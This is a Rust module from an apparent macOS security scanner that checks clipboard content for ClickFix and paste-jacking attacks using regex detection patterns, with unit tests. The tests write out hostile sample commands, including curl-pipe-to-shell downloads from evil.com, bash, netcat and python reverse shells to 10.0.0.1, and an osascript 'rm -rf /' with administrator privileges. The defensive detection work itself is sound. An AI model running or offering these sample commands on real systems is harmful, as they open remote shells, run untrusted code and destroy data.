//! Clipboard monitoring module for detecting ClickFix and paste-jacking attacks.
//!
//! ClickFix attacks trick users into pasting malicious commands from websites
//! into Terminal. This module inspects current clipboard content for known
//! attack patterns (reverse shells, curl-pipe-bash, encoded payloads, etc.)
//! without ever persisting clipboard contents to disk.

use anyhow::Result;
use async_trait::async_trait;
use regex::Regex;
use sha2::{Digest, Sha256};

use crate::finding::{
    calculate_cvss, CvssVector, Evidence, Finding, ModuleCategory, Severity,
};
use crate::modules::{ScanContext, ScanModule};

// ---------------------------------------------------------------------------
// Threat classification
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ClipboardThreatLevel {
    /// Active exploit command (reverse shell, curl|sh, etc.)
    Critical,
    /// Potentially malicious (encoded payloads, persistence installation, etc.)
    Suspicious,
    /// Benign content
    Safe,
}

#[derive(Debug, Clone)]
pub struct ClipboardAnalysis {
    pub threat_level: ClipboardThreatLevel,
    pub patterns_matched: Vec<String>,
    /// First 20 chars of content, sanitized (URLs replaced, base64 truncated)
    pub content_preview: String,
    pub content_length: usize,
}

// ---------------------------------------------------------------------------
// Clipboard reading (macOS pbpaste)
// ---------------------------------------------------------------------------

/// Read the current clipboard content via `pbpaste`.
/// Returns `None` if the clipboard is empty or pbpaste fails.
fn read_clipboard() -> Option<String> {
    std::process::Command::new("pbpaste")
        .output()
        .ok()
        .and_then(|o| {
            if o.status.success() {
                String::from_utf8(o.stdout).ok()
            } else {
                None
            }
        })
}

/// Compute SHA-256 hash of clipboard content for change detection.
/// The hash is used only in-memory and is never persisted.
pub fn clipboard_content_hash(content: &str) -> String {
    let hash = Sha256::new().chain_update(content.as_bytes()).finalize();
    format!("{:x}", hash)
}

// ---------------------------------------------------------------------------
// Pattern definitions
// ---------------------------------------------------------------------------

struct PatternDef {
    name: &'static str,
    pattern: &'static str,
}

/// Critical patterns — active exploit commands.
const CRITICAL_PATTERNS: &[PatternDef] = &[
    PatternDef {
        name: "curl-pipe-shell",
        pattern: r"curl\s.*\|\s*(ba)?sh",
    },
    PatternDef {
        name: "wget-pipe-shell",
        pattern: r"wget\s.*\|\s*(ba)?sh",
    },
    PatternDef {
        name: "bash-reverse-shell",
        pattern: r"bash\s+-i\s+>&\s*/dev/tcp/",
    },
    PatternDef {
        name: "netcat-reverse-shell",
        pattern: r"nc\s+(-e|-c)\s+/bin/(ba)?sh",
    },
    PatternDef {
        name: "python-reverse-shell",
        pattern: r"python[23]?\s+-c\s+.*socket.*connect",
    },
    PatternDef {
        name: "sudo-curl-pipe-shell",
        pattern: r"sudo\s+.*curl.*\|\s*sh",
    },
    PatternDef {
        name: "osascript-shell-exec",
        pattern: r"osascript\s+-e.*do\s+shell\s+script",
    },
];

/// Suspicious patterns — could be malicious.
const SUSPICIOUS_PATTERNS: &[PatternDef] = &[
    PatternDef {
        name: "base64-decode-pipe",
        pattern: r"base64\s+(-d|--decode).*\|",
    },
    PatternDef {
        name: "eval-execution",
        pattern: r"eval\s*\(",
    },
    PatternDef {
        name: "chmod-executable",
        pattern: r"chmod\s+[+]?[xX7]",
    },
    PatternDef {
        name: "launchctl-load",
        pattern: r"launchctl\s+load",
    },
    PatternDef {
        name: "defaults-hide-app",
        pattern: r"defaults\s+write.*LSUIElement",
    },
];

// ---------------------------------------------------------------------------
// Safe exclusion patterns — common developer commands that are NOT suspicious
// ---------------------------------------------------------------------------

const SAFE_PATTERNS: &[&str] = &[
    r"^(npm|yarn|pnpm)\s+install",
    r"^brew\s+install",
    r"^pip[3]?\s+install",
    r"^git\s+clone",
    r"^docker\s+run",
    r"^cargo\s+install",
];

// ---------------------------------------------------------------------------
// Analysis logic
// ---------------------------------------------------------------------------

/// Analyze clipboard content for malicious patterns.
/// This is the core detection function — it NEVER stores the actual content.
pub fn analyze_clipboard_content(content: &str) -> ClipboardAnalysis {
    let trimmed = content.trim();
    if trimmed.is_empty() {
        return ClipboardAnalysis {
            threat_level: ClipboardThreatLevel::Safe,
            patterns_matched: vec![],
            content_preview: String::new(),
            content_length: 0,
        };
    }

    // Check safe exclusions first
    for safe_pat in SAFE_PATTERNS {
        if let Ok(re) = Regex::new(safe_pat) {
            if re.is_match(trimmed) {
                return ClipboardAnalysis {
                    threat_level: ClipboardThreatLevel::Safe,
                    patterns_matched: vec![],
                    content_preview: sanitize_preview(trimmed),
                    content_length: trimmed.len(),
                };
            }
        }
    }

    let mut matched = Vec::new();
    let mut max_threat = ClipboardThreatLevel::Safe;

    // Check critical patterns
    for def in CRITICAL_PATTERNS {
        if let Ok(re) = Regex::new(def.pattern) {
            if re.is_match(trimmed) {
                matched.push(def.name.to_string());
                max_threat = ClipboardThreatLevel::Critical;
            }
        }
    }

    // Check suspicious patterns (only upgrade threat level, don't downgrade)
    for def in SUSPICIOUS_PATTERNS {
        if let Ok(re) = Regex::new(def.pattern) {
            if re.is_match(trimmed) {
                matched.push(def.name.to_string());
                if max_threat != ClipboardThreatLevel::Critical {
                    max_threat = ClipboardThreatLevel::Suspicious;
                }
            }
        }
    }

    // Heuristic: long single-line content without newlines suggests encoded blob
    if max_threat == ClipboardThreatLevel::Safe
        && trimmed.len() > 200
        && !trimmed.contains('\n')
        && !trimmed.contains(' ')
    {
        matched.push("long-encoded-blob".to_string());
        max_threat = ClipboardThreatLevel::Suspicious;
    }

    ClipboardAnalysis {
        threat_level: max_threat,
        patterns_matched: matched,
        content_preview: sanitize_preview(trimmed),
        content_length: trimmed.len(),
    }
}

/// Sanitize content preview: truncate to 20 chars, replace URLs and base64.
fn sanitize_preview(content: &str) -> String {
    let mut preview = content.chars().take(20).collect::<String>();

    // Replace URLs with placeholder
    if let Ok(url_re) = Regex::new(r"https?://\S+") {
        preview = url_re.replace_all(&preview, "[URL]").to_string();
    }

    // Replace long base64-like sequences with placeholder
    if let Ok(b64_re) = Regex::new(r"[A-Za-z0-9+/=]{20,}") {
        preview = b64_re.replace_all(&preview, "[ENCODED_DATA]").to_string();
    }

    preview
}

// ---------------------------------------------------------------------------
// Finding builder
// ---------------------------------------------------------------------------

fn build_clipboard_finding(analysis: &ClipboardAnalysis) -> Finding {
    let (severity, title, cvss_vector) = match analysis.threat_level {
        ClipboardThreatLevel::Critical => (
            Severity::Critical,
            "ClickFix/Paste-Jacking Attack Detected in Clipboard".to_string(),
            CvssVector {
                attack_vector: crate::finding::AttackVector::Local,
                attack_complexity: crate::finding::AttackComplexity::Low,
                privileges_required: crate::finding::PrivilegesRequired::None,
                user_interaction: crate::finding::UserInteraction::Required,
                scope: crate::finding::Scope::Changed,
                confidentiality: crate::finding::Impact::High,
                integrity: crate::finding::Impact::High,
                availability: crate::finding::Impact::High,
            },
        ),
        ClipboardThreatLevel::Suspicious => (
            Severity::Medium,
            "Suspicious Content Detected in Clipboard".to_string(),
            CvssVector {
                attack_vector: crate::finding::AttackVector::Local,
                attack_complexity: crate::finding::AttackComplexity::Low,
                privileges_required: crate::finding::PrivilegesRequired::None,
                user_interaction: crate::finding::UserInteraction::Required,
                scope: crate::finding::Scope::Unchanged,
                confidentiality: crate::finding::Impact::Low,
                integrity: crate::finding::Impact::Low,
                availability: crate::finding::Impact::None,
            },
        ),
        ClipboardThreatLevel::Safe => unreachable!("Safe content should not produce a finding"),
    };

    let cvss = calculate_cvss(&cvss_vector);
    let patterns_str = analysis.patterns_matched.join(", ");

    // PRIVACY: description must NOT contain clipboard content — only pattern
    // names, content length, and a sanitized preview
    let description = format!(
        "Clipboard contains potentially malicious content ({} bytes). \
         Matched patterns: [{}]. Preview: \"{}...\"",
        analysis.content_length, patterns_str, analysis.content_preview,
    );

    let remediation = match analysis.threat_level {
        ClipboardThreatLevel::Critical => {
            "CRITICAL: Do NOT paste this clipboard content into Terminal or any application. \
             Clear your clipboard immediately (copy any safe text). This appears to be a \
             ClickFix/paste-jacking attack designed to execute malicious commands on your Mac."
                .to_string()
        }
        ClipboardThreatLevel::Suspicious => {
            "Your clipboard contains content that could be malicious. Review it carefully \
             before pasting into Terminal. If you did not intentionally copy this content, \
             clear your clipboard immediately."
                .to_string()
        }
        ClipboardThreatLevel::Safe => String::new(),
    };

    Finding {
        id: format!(
            "{}-CLIP-001",
            severity.finding_id_prefix()
        ),
        title,
        severity,
        cvss,
        category: ModuleCategory::Configuration,
        description,
        reproduction: None,
        evidence: Evidence {
            messages: vec![],
            audit_record: None,
            canary_detected: false,
            os_events: vec![format!(
                "clipboard-patterns-matched: [{}]",
                patterns_str
            )],
            files_modified: vec![],
            network_connections: vec![],
            stderr_output: None,
        },
        remediation,
    }
}

// ---------------------------------------------------------------------------
// ScanModule implementation
// ---------------------------------------------------------------------------

#[derive(Default)]
pub struct ClipboardMonitorModule;

impl ClipboardMonitorModule {
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl ScanModule for ClipboardMonitorModule {
    fn name(&self) -> &str {
        "clipboard-monitor"
    }

    fn description(&self) -> &str {
        "Detects suspicious clipboard content (ClickFix/paste-jacking attacks)"
    }

    fn category(&self) -> ModuleCategory {
        ModuleCategory::Configuration
    }

    async fn run(&self, _ctx: &mut ScanContext) -> Result<Vec<Finding>> {
        self.run_standalone().await
    }

    async fn run_standalone(&self) -> Result<Vec<Finding>> {
        let content = match read_clipboard() {
            Some(c) if !c.is_empty() => c,
            _ => return Ok(vec![]),
        };

        let analysis = analyze_clipboard_content(&content);
        // content is dropped here — never persisted

        match analysis.threat_level {
            ClipboardThreatLevel::Critical | ClipboardThreatLevel::Suspicious => {
                Ok(vec![build_clipboard_finding(&analysis)])
            }
            ClipboardThreatLevel::Safe => Ok(vec![]),
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_curl_pipe_shell_is_critical() {
        let content = "curl https://evil.com/payload.sh | sh";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"curl-pipe-shell".to_string()));
    }

    #[test]
    fn test_curl_pipe_bash_is_critical() {
        let content = "curl -sSL https://evil.com/install.sh | bash";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"curl-pipe-shell".to_string()));
    }

    #[test]
    fn test_wget_pipe_shell_is_critical() {
        let content = "wget -qO- https://evil.com/backdoor.sh | bash";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"wget-pipe-shell".to_string()));
    }

    #[test]
    fn test_bash_reverse_shell_is_critical() {
        let content = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"bash-reverse-shell".to_string()));
    }

    #[test]
    fn test_netcat_reverse_shell_is_critical() {
        let content = "nc -e /bin/sh 10.0.0.1 4444";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"netcat-reverse-shell".to_string()));
    }

    #[test]
    fn test_python_reverse_shell_is_critical() {
        let content = r#"python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.1",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno())'"#;
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"python-reverse-shell".to_string()));
    }

    #[test]
    fn test_sudo_curl_pipe_is_critical() {
        let content = "sudo bash -c 'curl https://evil.com/rootkit.sh | sh'";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"sudo-curl-pipe-shell".to_string()));
    }

    #[test]
    fn test_osascript_shell_exec_is_critical() {
        let content = r#"osascript -e 'do shell script "rm -rf /" with administrator privileges'"#;
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.contains(&"osascript-shell-exec".to_string()));
    }

    #[test]
    fn test_base64_decode_pipe_is_suspicious() {
        let content = "echo 'bWFsd2FyZQ==' | base64 --decode | sh";
        let analysis = analyze_clipboard_content(content);
        // This matches both base64-decode-pipe (suspicious) and is piped to sh
        assert_ne!(analysis.threat_level, ClipboardThreatLevel::Safe);
        assert!(analysis.patterns_matched.contains(&"base64-decode-pipe".to_string()));
    }

    #[test]
    fn test_eval_is_suspicious() {
        let content = "eval(atob('bWFsd2FyZQ=='))";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
        assert!(analysis.patterns_matched.contains(&"eval-execution".to_string()));
    }

    #[test]
    fn test_chmod_executable_is_suspicious() {
        let content = "chmod +x /tmp/payload && /tmp/payload";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
        assert!(analysis.patterns_matched.contains(&"chmod-executable".to_string()));
    }

    #[test]
    fn test_launchctl_load_is_suspicious() {
        let content = "launchctl load ~/Library/LaunchAgents/com.evil.plist";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
        assert!(analysis.patterns_matched.contains(&"launchctl-load".to_string()));
    }

    #[test]
    fn test_defaults_hide_app_is_suspicious() {
        let content = "defaults write com.evil.app LSUIElement -bool true";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
        assert!(analysis.patterns_matched.contains(&"defaults-hide-app".to_string()));
    }

    #[test]
    fn test_long_encoded_blob_is_suspicious() {
        // 300-char string with no spaces or newlines
        let content = "a".repeat(300);
        let analysis = analyze_clipboard_content(&content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Suspicious);
        assert!(analysis.patterns_matched.contains(&"long-encoded-blob".to_string()));
    }

    #[test]
    fn test_plain_text_is_safe() {
        let content = "Hello, this is just some regular text.";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
        assert!(analysis.patterns_matched.is_empty());
    }

    #[test]
    fn test_npm_install_is_safe() {
        let content = "npm install express";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    #[test]
    fn test_brew_install_is_safe() {
        let content = "brew install wget";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    #[test]
    fn test_pip_install_is_safe() {
        let content = "pip install requests";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    #[test]
    fn test_git_clone_is_safe() {
        let content = "git clone https://github.com/user/repo.git";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    #[test]
    fn test_docker_run_is_safe() {
        let content = "docker run -it ubuntu bash";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    #[test]
    fn test_cargo_install_is_safe() {
        let content = "cargo install ripgrep";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    #[test]
    fn test_empty_clipboard_is_safe() {
        let analysis = analyze_clipboard_content("");
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
        assert!(analysis.patterns_matched.is_empty());
    }

    #[test]
    fn test_whitespace_only_is_safe() {
        let analysis = analyze_clipboard_content("   \n\t  ");
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Safe);
    }

    // --- Privacy tests ---

    #[test]
    fn test_finding_does_not_contain_clipboard_content() {
        let content = "curl https://evil.com/payload.sh | sh";
        let analysis = analyze_clipboard_content(content);
        let finding = build_clipboard_finding(&analysis);

        // The finding description should NOT contain the full clipboard content
        assert!(!finding.description.contains("https://evil.com/payload.sh"));
        // But should contain pattern names
        assert!(finding.description.contains("curl-pipe-shell"));
        // Should contain the byte count
        assert!(finding.description.contains("bytes"));
    }

    #[test]
    fn test_content_preview_sanitization() {
        let preview = sanitize_preview("https://evil.com/malware.sh | bash");
        assert!(preview.contains("[URL]"));
        assert!(!preview.contains("evil.com"));
    }

    #[test]
    fn test_content_preview_truncated_to_20_chars() {
        let long_content = "a".repeat(100);
        let preview = sanitize_preview(&long_content);
        assert!(preview.len() <= 20);
    }

    #[test]
    fn test_content_preview_base64_sanitized() {
        let b64_content = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop";
        let preview = sanitize_preview(b64_content);
        assert!(preview.contains("[ENCODED_DATA]"));
    }

    #[test]
    fn test_clipboard_hash_is_consistent() {
        let content = "test content";
        let h1 = clipboard_content_hash(content);
        let h2 = clipboard_content_hash(content);
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_clipboard_hash_differs_for_different_content() {
        let h1 = clipboard_content_hash("content A");
        let h2 = clipboard_content_hash("content B");
        assert_ne!(h1, h2);
    }

    #[test]
    fn test_critical_overrides_suspicious() {
        // Content that matches both critical and suspicious patterns
        let content = "sudo curl https://evil.com/rootkit.sh | sh && chmod +x /tmp/payload";
        let analysis = analyze_clipboard_content(content);
        assert_eq!(analysis.threat_level, ClipboardThreatLevel::Critical);
        assert!(analysis.patterns_matched.len() >= 2);
    }

    #[test]
    fn test_finding_severity_matches_threat_level() {
        let critical_content = "curl https://evil.com/payload.sh | sh";
        let critical_analysis = analyze_clipboard_content(critical_content);
        let critical_finding = build_clipboard_finding(&critical_analysis);
        assert_eq!(critical_finding.severity, Severity::Critical);

        let suspicious_content = "chmod +x /tmp/some_file";
        let suspicious_analysis = analyze_clipboard_content(suspicious_content);
        let suspicious_finding = build_clipboard_finding(&suspicious_analysis);
        assert_eq!(suspicious_finding.severity, Severity::Medium);
    }
}
